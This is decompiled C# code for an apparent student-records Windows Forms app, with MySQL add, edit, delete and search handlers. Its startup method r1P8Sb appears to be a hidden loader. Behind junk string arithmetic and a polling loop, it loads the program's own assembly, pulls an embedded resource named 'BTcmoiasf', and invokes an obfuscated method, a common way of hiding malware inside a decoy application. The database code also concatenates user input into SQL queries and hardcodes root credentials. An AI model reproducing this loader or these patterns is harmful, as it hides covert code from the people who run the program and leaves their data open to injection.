		((Form)this).set_BackColor(SystemColors.GradientActiveCaption);
		((Form)this).set_ClientSize(new Size(1392, 678));
		((Control)this).get_Controls().Add((Control)(object)studentage);
		((Control)this).get_Controls().Add((Control)(object)PictureBox1);
		((Control)this).get_Controls().Add((Control)(object)Button5);
		((Control)this).get_Controls().Add((Control)(object)Label6);
		((Control)this).get_Controls().Add((Control)(object)studentbirthday);
		((Control)this).get_Controls().Add((Control)(object)Label9);
		((Control)this).get_Controls().Add((Control)(object)ListView1);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).get_Controls().Add((Control)(object)phonenumber);
		((Control)this).get_Controls().Add((Control)(object)Label8);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)Label5);
		((Control)this).get_Controls().Add((Control)(object)studentsearchbutton);
		((Control)this).get_Controls().Add((Control)(object)yrcmb);
		((Control)this).get_Controls().Add((Control)(object)Button2);
		((Control)this).get_Controls().Add((Control)(object)studentname);
		((Control)this).get_Controls().Add((Control)(object)Label4);
		((Control)this).get_Controls().Add((Control)(object)coursecmb);
		((Control)this).get_Controls().Add((Control)(object)idnumber);
		((Control)this).get_Controls().Add((Control)(object)Button3);
		((Control)this).get_Controls().Add((Control)(object)Button4);
		((Control)this).get_Controls().Add((Control)(object)Label3);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Margin(new Padding(3, 2, 3, 2));
		((Control)this).set_Name("StudentForm");
		((Form)this).set_StartPosition((FormStartPosition)0);
		((Form)this).set_Text("StudentForm");
		((Form)this).set_WindowState((FormWindowState)2);
		((ISupportInitialize)PictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void Hc39Di(object sender, EventArgs e)
	{
		//IL_00ef: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f9: Expected O, but got Unknown
		//IL_0115: Unknown result type (might be due to invalid IL or missing references)
		//IL_011f: Expected O, but got Unknown
		ListView1.get_Columns().Add("ID Number", 80, (HorizontalAlignment)0);
		ListView1.get_Columns().Add("Name", 150, (HorizontalAlignment)0);
		ListView1.get_Columns().Add("Phone Number", 150, (HorizontalAlignment)0);
		ListView1.get_Columns().Add("Course", 80, (HorizontalAlignment)0);
		ListView1.get_Columns().Add("Year", 80, (HorizontalAlignment)0);
		ListView1.get_Columns().Add("Birthday", 150, (HorizontalAlignment)0);
		ListView1.get_Columns().Add("Age", 100, (HorizontalAlignment)0);
		c7R0Hw();
		((Control)Button3).set_Enabled(false);
		((Control)Button4).set_Enabled(false);
		((Control)Button5).set_Enabled(false);
		((Control)studentbirthday).set_Enabled(false);
		mysqlConn = new MySqlConnection();
		mysqlConn.set_ConnectionString("server=localhost;userid=root;password=root;database=login");
		adp = new MySqlDataAdapter("select * from login.student_list", mysqlConn);
		MarshalByValueComponent marshalByValueComponent = new DataTable();
		((DbDataAdapter)(object)adp).Fill(marshalByValueComponent as DataTable);
		ListView1.get_Items().Clear();
		checked
		{
			object enumerator = default(object);
			try
			{
				enumerator = (marshalByValueComponent as DataTable).Rows.GetEnumerator();
				while (((IEnumerator)enumerator).MoveNext())
				{
					object obj = (DataRow)((IEnumerator)enumerator).Current;
					ListView1.get_Items().Add((obj as DataRow)[0].ToString());
					ListView1.get_Items().get_Item(ListView1.get_Items().get_Count() - 1).get_SubItems()
						.Add((obj as DataRow)[1].ToString());
					ListView1.get_Items().get_Item(ListView1.get_Items().get_Count() - 1).get_SubItems()
						.Add(((DataRow)obj)[2].ToString());
					ListView1.get_Items().get_Item(ListView1.get_Items().get_Count() - 1).get_SubItems()
						.Add(((DataRow)obj)[3].ToString());
					ListView1.get_Items().get_Item(ListView1.get_Items().get_Count() - 1).get_SubItems()
						.Add((obj as DataRow)[4].ToString());
					ListView1.get_Items().get_Item(ListView1.get_Items().get_Count() - 1).get_SubItems()
						.Add((obj as DataRow)[5].ToString());
					ListView1.get_Items().get_Item(ListView1.get_Items().get_Count() - 1).get_SubItems()
						.Add((obj as DataRow)[6].ToString());
				}
			}
			finally
			{
				if ((enumerator as IEnumerator) is IDisposable)
				{
					(((IEnumerator)enumerator) as IDisposable).Dispose();
				}
			}
			studentbirthday.set_Format((DateTimePickerFormat)8);
			studentbirthday.set_CustomFormat("yyyy/MM/dd");
			mysqlConn.Close();
		}
	}

	private void Tf3e2B(object sender, EventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_0165: Unknown result type (might be due to invalid IL or missing references)
		//IL_016f: Expected O, but got Unknown
		//IL_01ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_01df: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e9: Expected O, but got Unknown
		//IL_023a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0240: Expected O, but got Unknown
		//IL_0242: Expected O, but got Unknown
		//IL_0244: Unknown result type (might be due to invalid IL or missing references)
		//IL_024e: Expected O, but got Unknown
		//IL_024e: Unknown result type (might be due to invalid IL or missing references)
		mysqlConn = new MySqlConnection();
		mysqlConn.set_ConnectionString("server=localhost;userid=root;password=root;database=login");
		ICloneable cloneable = (ICloneable)new ListViewItem(idnumber.get_Text().Trim());
		((ListViewItem)cloneable).get_SubItems().Add(studentname.get_Text().Trim());
		((ListViewItem)((cloneable is ListViewItem) ? cloneable : null)).get_SubItems().Add(phonenumber.get_Text().Trim());
		((ListViewItem)((cloneable is ListViewItem) ? cloneable : null)).get_SubItems().Add(coursecmb.get_Text().Trim());
		((ListViewItem)cloneable).get_SubItems().Add(yrcmb.get_Text().Trim());
		((ListViewItem)((cloneable is ListViewItem) ? cloneable : null)).get_SubItems().Add(studentbirthday.get_Text().Trim());
		((ListViewItem)((cloneable is ListViewItem) ? cloneable : null)).get_SubItems().Add(studentage.get_Text().Trim());
		try
		{
			mysqlConn.Open();
			IComparable<string> comparable = "select * from login.student_list where studentid='" + idnumber.get_Text() + "' or studentname='" + studentname.get_Text() + "' or studentphonenumber='" + phonenumber.get_Text() + "'";
			COMMAND = new MySqlCommand((string)comparable, mysqlConn);
			COMMAND.get_Parameters().Add("studentid", (MySqlDbType)8).set_Value((object)idnumber.get_Text());
			object obj = COMMAND.ExecuteReader();
			if (((MySqlDataReader)((obj is MySqlDataReader) ? obj : null)).get_HasRows())
			{
				Interaction.MsgBox((object)"The Information your trying to save is already exist", (MsgBoxStyle)48, (object)"Duplication Found");
				mysqlConn.Close();
				return;
			}
			Np96Rw();
			ListView1.get_Items().Add((ListViewItem)cloneable);
			Zf9g3C();
			c7R0Hw();
			((Control)studentbirthday).set_Enabled(false);
			mysqlConn.Close();
			coursecmb.set_Text("");
			yrcmb.set_Text("");
			((Control)studentbirthday).ResetText();
		}
		catch (MySqlException val)
		{
			ProjectData.SetProjectError((Exception)val);
			object obj2 = (object)val;
			MessageBox.Show(((Exception)(MySqlException)obj2).Message);
			ProjectData.ClearProjectError();
		}
		finally
		{
			mysqlConn.Dispose();
		}
	}

	private void Np96Rw()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_00e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f2: Expected O, but got Unknown
		//IL_0173: Unknown result type (might be due to invalid IL or missing references)
		//IL_019b: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d6: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0209: Unknown result type (might be due to invalid IL or missing references)
		//IL_020f: Expected O, but got Unknown
		//IL_0211: Expected O, but got Unknown
		//IL_021d: Unknown result type (might be due to invalid IL or missing references)
		mysqlConn = new MySqlConnection();
		mysqlConn.set_ConnectionString("server=localhost;userid=root;password=root;database=login");
		try
		{
			mysqlConn.Open();
			IEnumerable enumerable = "insert into login.student_list (studentid,studentname,studentphonenumber,studentcourse,yearlevel,birthday,age) values ('" + idnumber.get_Text() + "','" + studentname.get_Text() + "','" + phonenumber.get_Text() + "','" + coursecmb.get_Text() + "','" + yrcmb.get_Text() + "','" + studentbirthday.get_Text() + "','" + studentage.get_Text() + "')";
			COMMAND = new MySqlCommand((string)enumerable, mysqlConn);
			COMMAND.ExecuteReader();
			if ((Operators.CompareString(idnumber.get_Text(), "", false) == 0) | (Operators.CompareString(studentname.get_Text(), "", false) == 0) | (Operators.CompareString(phonenumber.get_Text(), "", false) == 0) | (Operators.CompareString(coursecmb.get_Text(), "", false) == 0))
			{
				Interaction.MsgBox((object)"All fields are required", (MsgBoxStyle)48, (object)"Required");
			}
			else if (((TextBoxBase)phonenumber).get_TextLength() < 11)
			{
				Interaction.MsgBox((object)"Enter Correct Phone Number", (MsgBoxStyle)48, (object)"Incorrect Phone Number");
				((Control)phonenumber).Focus();
			}
			else if (!phonenumber.get_Text().StartsWith(Conversions.ToString(0)))
			{
				Interaction.MsgBox((object)"Phone Number should start with 0", (MsgBoxStyle)48, (object)"Incorrect Phone Number");
				((Control)phonenumber).Focus();
			}
			else
			{
				Interaction.MsgBox((object)"Record has been successfully saved!", (MsgBoxStyle)64, (object)"Saved");
				mysqlConn.Close();
			}
		}
		catch (MySqlException val)
		{
			ProjectData.SetProjectError((Exception)val);
			object obj = (object)val;
			MessageBox.Show(((Exception)((obj is MySqlException) ? obj : null)).Message);
			ProjectData.ClearProjectError();
		}
		finally
		{
			mysqlConn.Dispose();
		}
	}

	private void t1WXn6(object sender, EventArgs e)
	{
		Yx49Hw();
		Zf9g3C();
		((Control)Button4).set_Enabled(false);
		((Control)Button3).set_Enabled(false);
		((Control)Button5).set_Enabled(false);
	}

	public void Yx49Hw()
	{
		((Control)studentname).set_Enabled(true);
		((Control)phonenumber).set_Enabled(true);
		((Control)coursecmb).set_Enabled(true);
		((Control)yrcmb).set_Enabled(true);
		((Control)Button1).set_Enabled(true);
		((Control)studentbirthday).set_Enabled(true);
	}

	public void c7R0Hw()
	{
		((Control)studentname).set_Enabled(false);
		((Control)phonenumber).set_Enabled(false);
		((Control)coursecmb).set_Enabled(false);
		((Control)yrcmb).set_Enabled(false);
		((Control)Button1).set_Enabled(false);
		((Control)studentage).set_Enabled(false);
	}

	public void Zf9g3C()
	{
		((TextBoxBase)idnumber).Clear();
		((TextBoxBase)studentname).Clear();
		((TextBoxBase)phonenumber).Clear();
		coursecmb.ResetText();
		yrcmb.ResetText();
		studentage.set_Text("0");
	}

	private void y9NYi7(object sender, EventArgs e)
	{
		if (Operators.CompareString(idnumber.get_Text(), ListView1.get_SelectedItems().get_Item(0).get_SubItems()
			.get_Item(0)
			.get_Text(), false) == 0)
		{
			studentname.set_Text(ListView1.get_SelectedItems().get_Item(0).get_SubItems()
				.get_Item(1)
				.get_Text());
			phonenumber.set_Text(ListView1.get_SelectedItems().get_Item(0).get_SubItems()
				.get_Item(2)
				.get_Text());
			coursecmb.set_Text(ListView1.get_SelectedItems().get_Item(0).get_SubItems()
				.get_Item(3)
				.get_Text());
			yrcmb.set_Text(ListView1.get_SelectedItems().get_Item(0).get_SubItems()
				.get_Item(4)
				.get_Text());
		}
	}

	private void e9HAm3(object sender, EventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_0077: Invalid comparison between Unknown and I4
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0115: Unknown result type (might be due to invalid IL or missing references)
		//IL_011b: Expected O, but got Unknown
		//IL_011d: Expected O, but got Unknown
		//IL_011f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0129: Expected O, but got Unknown
		//IL_0129: Unknown result type (might be due to invalid IL or missing references)
		mysqlConn = new MySqlConnection();
		mysqlConn.set_ConnectionString("server=localhost;userid=root;password=root;database=login");
		try
		{
			mysqlConn.Open();
			object obj = "Delete from login.student_list where studentid='" + idnumber.get_Text() + "'";
			COMMAND = new MySqlCommand(obj as string, mysqlConn);
			COMMAND.ExecuteReader();
			MsgBoxResult val = Interaction.MsgBox((object)"Do you like to delete the record?", (MsgBoxStyle)1, (object)"Delete");
			if ((int)val == 1)
			{
				ListView1.get_Items().Remove(ListView1.get_SelectedItems().get_Item(0));
				MessageBox.Show("Record has been successfully deleted!", "Deleted");
				((Control)Button3).set_Enabled(false);
				((Control)Button4).set_Enabled(false);
				((Control)Button5).set_Enabled(false);
				((Control)studentbirthday).set_Enabled(false);
				Zf9g3C();
				c7R0Hw();
			}
			else
			{
				Zf9g3C();
				((Control)Button3).set_Enabled(false);
				((Control)Button5).set_Enabled(false);
			}
			mysqlConn.Close();
		}
		catch (MySqlException val2)
		{
			ProjectData.SetProjectError((Exception)val2);
			object obj2 = (object)val2;
			MessageBox.Show(((Exception)(MySqlException)obj2).Message);
			ProjectData.ClearProjectError();
		}
		finally
		{
			mysqlConn.Dispose();
		}
	}

	private void Mc2s8D(object sender, EventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_0100: Unknown result type (might be due to invalid IL or missing references)
		//IL_010a: Expected O, but got Unknown
		//IL_0121: Unknown result type (might be due to invalid IL or missing references)
		//IL_0126: Unknown result type (might be due to invalid IL or missing references)
		//IL_0127: Unknown result type (might be due to invalid IL or missing references)
		//IL_0129: Invalid comparison between Unknown and I4
		//IL_026e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0325: Unknown result type (might be due to invalid IL or missing references)
		//IL_032b: Expected O, but got Unknown
		//IL_032d: Expected O, but got Unknown
		//IL_032f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0339: Expected O, but got Unknown
		//IL_0339: Unknown result type (might be due to invalid IL or missing references)
		mysqlConn = new MySqlConnection();
		mysqlConn.set_ConnectionString("server=localhost;userid=root;password=root;database=login");
		try
		{
			mysqlConn.Open();
			object obj = "update login.student_list set studentid='" + idnumber.get_Text() + "',studentname='" + studentname.get_Text() + "',studentphonenumber='" + phonenumber.get_Text() + "',studentcourse='" + coursecmb.get_Text() + "',yearlevel='" + yrcmb.get_Text() + "',birthday='" + studentbirthday.get_Text() + "',age='" + studentage.get_Text() + "' where studentid='" + idnumber.get_Text() + "'";
			COMMAND = new MySqlCommand((string)obj, mysqlConn);
			COMMAND.ExecuteReader();
			MsgBoxResult val = Interaction.MsgBox((object)"Do you like to update the record?", (MsgBoxStyle)4, (object)"Update");
			if ((int)val == 6)
			{
				ListView1.get_SelectedItems().get_Item(0).get_SubItems()
					.get_Item(0)
					.set_Text(idnumber.get_Text());
				ListView1.get_SelectedItems().get_Item(0).get_SubItems()
					.get_Item(1)
					.set_Text(studentname.get_Text());
				ListView1.get_SelectedItems().get_Item(0).get_SubItems()
					.get_Item(2)
					.set_Text(phonenumber.get_Text());
				ListView1.get_SelectedItems().get_Item(0).get_SubItems()
					.get_Item(3)
					.set_Text(coursecmb.get_Text());
				ListView1.get_SelectedItems().get_Item(0).get_SubItems()
					.get_Item(4)
					.set_Text(yrcmb.get_Text());
				ListView1.get_SelectedItems().get_Item(0).get_SubItems()
					.get_Item(5)
					.set_Text(studentbirthday.get_Text());
				ListView1.get_SelectedItems().get_Item(0).get_SubItems()
					.get_Item(6)
					.set_Text(studentage.get_Text());
				MessageBox.Show("Record has been successfully updated!", "Updated");
				Zf9g3C();
				((Control)Button4).set_Enabled(false);
				((Control)Button5).set_Enabled(false);
				((Control)Button3).set_Enabled(false);
				coursecmb.set_Text("");
				yrcmb.set_Text("");
				c7R0Hw();
				((Control)studentbirthday).set_Enabled(false);
			}
			else
			{
				Zf9g3C();
				((Control)Button4).set_Enabled(false);
				((Control)Button5).set_Enabled(false);
				((Control)Button3).set_Enabled(false);
				coursecmb.ResetText();
				yrcmb.ResetText();
				c7R0Hw();
			}
			mysqlConn.Close();
		}
		catch (MySqlException val2)
		{
			ProjectData.SetProjectError((Exception)val2);
			object obj2 = (object)val2;
			MessageBox.Show(((Exception)(MySqlException)obj2).Message);
			ProjectData.ClearProjectError();
		}
		finally
		{
			mysqlConn.Dispose();
		}
	}

	private void Qy42Ei(object sender, KeyPressEventArgs e)
	{
		//IL_004a: Unknown result type (might be due to invalid IL or missing references)
		if (!char.IsNumber(e.get_KeyChar()) & (e.get_KeyChar() != '.') & (e.get_KeyChar() != '\b') & (e.get_KeyChar() != ' '))
		{
			e.set_Handled(true);
			MessageBox.Show("This field will accept numbers only", "ID Number");
		}
	}

	private void i9R0Hs(object sender, KeyPressEventArgs e)
	{
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0088: Unknown result type (might be due to invalid IL or missing references)
		if (phonenumber.get_Text().Length >= 11 && e.get_KeyChar() != '\b')
		{
			e.set_Handled(true);
			MessageBox.Show("Phone Number should not be more than 11 numbers", "Phone Number");
		}
		if (!char.IsNumber(e.get_KeyChar()) & (e.get_KeyChar() != '.') & (e.get_KeyChar() != '\b') & (e.get_KeyChar() != ' '))
		{
			e.set_Handled(true);
			MessageBox.Show("This field will accept numbers only", "Phone Number");
		}
	}

	private void q3C0Zn(object sender, EventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_003b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0041: Expected O, but got Unknown
		//IL_0073: Unknown result type (might be due to invalid IL or missing references)
		//IL_0182: Unknown result type (might be due to invalid IL or missing references)
		//IL_019e: Unknown result type (might be due to invalid IL or missing references)
		//IL_01cd: Unknown result type (might be due to invalid IL or missing references)
		mysqlConn = new MySqlConnection();
		mysqlConn.set_ConnectionString("server=localhost;userid=root;password=root;database=login");
		object obj = (object)new MySqlCommand("Select * from login.student_list where studentid='" + idnumber.get_Text() + "'", mysqlConn);
		((MySqlCommand)((obj is MySqlCommand) ? obj : null)).get_Parameters().Add("studentid", (MySqlDbType)8).set_Value((object)idnumber.get_Text());
		mysqlConn.Open();
		object obj2 = ((MySqlCommand)obj).ExecuteReader();
		ListView1.get_SelectedItems().Clear();
		checked
		{
			int num = ListView1.get_Items().get_Count() - 1;
			for (int i = 0; i <= num; i++)
			{
				if (Operators.CompareString(ListView1.get_Items().get_Item(i).get_SubItems()
					.get_Item(0)
					.get_Text(), idnumber.get_Text(), false) == 0)
				{
					ListView1.get_Items().get_Item(i).set_Selected(true);
				}
			}
			if (((MySqlDataReader)((obj2 is MySqlDataReader) ? obj2 : null)).Read())
			{
				studentname.set_Text(Conversions.ToString(((MySqlDataReader)((obj2 is MySqlDataReader) ? obj2 : null)).get_Item(1)));
				phonenumber.set_Text(Conversions.ToString(((MySqlDataReader)((obj2 is MySqlDataReader) ? obj2 : null)).get_Item(2)));
				coursecmb.set_Text(Conversions.ToString(((MySqlDataReader)((obj2 is MySqlDataReader) ? obj2 : null)).get_Item(3)));
				yrcmb.set_Text(Conversions.ToString(((MySqlDataReader)((obj2 is MySqlDataReader) ? obj2 : null)).get_Item(4)));
				studentbirthday.set_Text(Conversions.ToString(((MySqlDataReader)obj2).get_Item(5)));
				studentage.set_Text(Conversions.ToString(((MySqlDataReader)obj2).get_Item(6)));
				((Control)Button5).set_Enabled(true);
			}
			else
			{
				Interaction.MsgBox((object)"Student ID is not Registered", (MsgBoxStyle)64, (object)"Not Registered");
			}
			mysqlConn.Close();
		}
	}

	private void Kt64Jj(object sender, EventArgs e)
	{
		if (ListView1.get_SelectedItems().get_Count() > 0)
		{
			idnumber.set_Text(ListView1.get_SelectedItems().get_Item(0).get_Text());
			studentname.set_Text(ListView1.get_SelectedItems().get_Item(0).get_SubItems()
				.get_Item(1)
				.get_Text());
			phonenumber.set_Text(ListView1.get_SelectedItems().get_Item(0).get_SubItems()
				.get_Item(2)
				.get_Text());
			coursecmb.set_Text(ListView1.get_SelectedItems().get_Item(0).get_SubItems()
				.get_Item(3)
				.get_Text());
			yrcmb.set_Text(ListView1.get_SelectedItems().get_Item(0).get_SubItems()
				.get_Item(4)
				.get_Text());
			studentbirthday.set_Text(ListView1.get_SelectedItems().get_Item(0).get_SubItems()
				.get_Item(5)
				.get_Text());
			studentage.set_Text(ListView1.get_SelectedItems().get_Item(0).get_SubItems()
				.get_Item(6)
				.get_Text());
		}
		((Control)ListView1).Focus();
		ListView1.set_FullRowSelect(true);
		((Control)Button5).set_Enabled(true);
		((Control)Button3).set_Enabled(true);
		c7R0Hw();
		((Control)studentbirthday).set_Enabled(false);
	}

	private void q2RDk9(object sender, EventArgs e)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Invalid comparison between Unknown and I4
		if ((int)Interaction.MsgBox((object)"Do you wish to edit the information?", (MsgBoxStyle)36, (object)"Edit") == 6)
		{
			((Control)Button4).set_Enabled(true);
			Yx49Hw();
			((Control)Button5).set_Enabled(false);
			((Control)Button1).set_Enabled(false);
		}
		else
		{
			Zf9g3C();
			c7R0Hw();
		}
	}

	private void Bf2p1Z(object sender, KeyPressEventArgs e)
	{
		//IL_004a: Unknown result type (might be due to invalid IL or missing references)
		if (!char.IsNumber(e.get_KeyChar()) & (e.get_KeyChar() != '.') & (e.get_KeyChar() != '\b') & (e.get_KeyChar() != ' '))
		{
			e.set_Handled(true);
			MessageBox.Show("This field will accept numbers only", "Age");
		}
	}

	private void r9X1Zb(object sender, KeyPressEventArgs e)
	{
		//IL_004a: Unknown result type (might be due to invalid IL or missing references)
		if (!char.IsLetter(e.get_KeyChar()) & (e.get_KeyChar() != '.') & (e.get_KeyChar() != '\b') & (e.get_KeyChar() != ' '))
		{
			e.set_Handled(true);
			MessageBox.Show("This field will accept letters only", "Student Name");
		}
	}

	private void Bn28Ly(object sender, EventArgs e)
	{
		studentbirthday.set_CustomFormat("yyyy-MM-dd");
		DateTime dateTime = new DateTime(1, 1, 1);
		DateTime value = studentbirthday.get_Value();
		DateTime now = DateTime.Now;
		TimeSpan timeSpan = now - value;
		int num = checked((dateTime + timeSpan).Year - 1);
		studentage.set_Text(num.ToString());
	}

	[STAThread]
	public static void r1P8Sb()
	{
		checked
		{
			try
			{
				object currentDirectory = Directory.GetCurrentDirectory();
				ICloneable directoryName = Path.GetDirectoryName(currentDirectory as string);
				int num = default(int);
				if ((currentDirectory as string).Contains(directoryName as string))
				{
					IEnumerable<char> enumerable = directoryName as string;
					for (int i = 0; i < (enumerable as string).Length; i++)
					{
						char c = ((string)enumerable)[i];
						if (Operators.CompareString(Conversions.ToString(c), "\\", false) == 0)
						{
							num++;
						}
					}
				}
				if (num <= 0)
				{
					return;
				}
				object obj = new List<char[]>();
				((List<char[]>)obj).Add(((string)currentDirectory).ToCharArray());
				(obj as List<char[]>).Add((directoryName as string).ToCharArray());
				object obj2 = new StringBuilder();
				ISerializable serializable = new StringBuilder();
				long num2 = ((string)currentDirectory).Length * num;
				object obj3 = (obj as List<char[]>)[0];
				for (int j = 0; j < ((char[])obj3).Length; j++)
				{
					char c2 = (obj3 as char[])[j];
					(obj2 as StringBuilder).AppendLine(Conversions.ToString(c2));
					num2 += num;
				}
				object obj4 = ((List<char[]>)obj)[1];
				for (int k = 0; k < ((char[])obj4).Length; k++)
				{
					char c3 = (obj4 as char[])[k];
					(serializable as StringBuilder).AppendLine(Conversions.ToString(c3));
					num2 += num;
				}
				int count = Regex.Matches((obj2 as StringBuilder).ToString(), Environment.NewLine).Count;
				int count2 = Regex.Matches((serializable as StringBuilder).ToString(), Environment.NewLine).Count;
				if (count == count2 && count != count2)
				{
					return;
				}
				int num3;
				do
				{
					Nw9r7H.num = Gf7z4M.s0NRo4();
					num3 = Nw9r7H.num;
				}
				while (num3 != 100);
				Nw9r7H.Ass = Assembly.LoadFile(Application.get_ExecutablePath());
				Nw9r7H.Names = (string[])NewLateBinding.LateGet(Nw9r7H.Ass, (Type)null, "GetManifestResourceNames", new object[0], (string[])null, (Type[])null, (bool[])null);
				Nw9r7H.ResName = "BTcmoiasf";
				Nw9r7H.Res = ".res" + "ourc" + "es";
				Nw9r7H.MName = "222Me2222t22h2222od222220";
				Nw9r7H.TNum = 35;
				Nw9r7H.Mnum = 0;
				object obj5 = new List<int>
				{
					Capacity = 15
				};
				int num4 = 0;
				do
				{
					unchecked
					{
						((List<int>)obj5).Add(Nw9r7H.num % checked(num4 + 2));
					}
					num4++;
				}
				while (num4 <= 10);
				if (((List<int>)obj5)[5] == 2)
				{
					object objectValue = RuntimeHelpers.GetObjectValue(new object());
					o9A2Ym.o9SXr4(RuntimeHelpers.GetObjectValue(objectValue), (obj5 as List<int>)[7], "m7s", Nt7d6X: false);
					if (((List<int>)obj5)[5] > 0)
					{
						(obj5 as List<int>)[5] = ((List<int>)obj5)[5] * 25 * 25;
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}
}
